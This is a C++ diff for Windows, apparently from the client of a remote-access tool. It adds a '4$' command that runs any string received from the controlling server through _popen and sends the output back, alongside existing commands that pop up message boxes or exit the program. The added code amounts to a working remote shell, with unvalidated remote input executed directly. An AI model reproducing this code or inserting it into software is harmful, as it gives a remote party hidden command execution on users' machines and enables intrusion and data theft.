@@ -44,6 +44,15 @@ void Command::execCommand()
 		
 		MessageBox(NULL, msg.c_str() , title.c_str(), MB_ICONINFORMATION | MB_OKCANCEL);
 	}
+	else if (prepos.compare("4$") == 0) //Terminal
+	{
+		//system(_cmd.c_str());
+		std::string temp = "4$";
+		temp += exec(_cmd.c_str());
+		if (DEBUG)
+			std::cout << "Terminal answer" << temp << std::endl;
+		_client->sender(temp);
+	}
 	else if (prepos.compare("$$") == 0)
 	{
 		exit(0);
@@ -155,4 +164,17 @@ int separator_pos = getSeparation(cmd, ".") + 2;	//2 cuz of ..
 	if (DEBUG)
 		std::cout << "x = " << atoi(temp.c_str()) << std::endl;
 	return atoi(temp.c_str());
+}
+
+std::string Command::exec(const char * terminalCmd)
+{
+	char buffer[128];
+	std::string result = "";
+	std::shared_ptr<FILE> pipe(_popen(terminalCmd, "r"), _pclose);
+	if (!pipe) throw std::runtime_error("popen() failed!");
+	while (!feof(pipe.get())) {
+		if (fgets(buffer, 128, pipe.get()) != NULL)
+			result += buffer;
+	}
+	return result;
 }
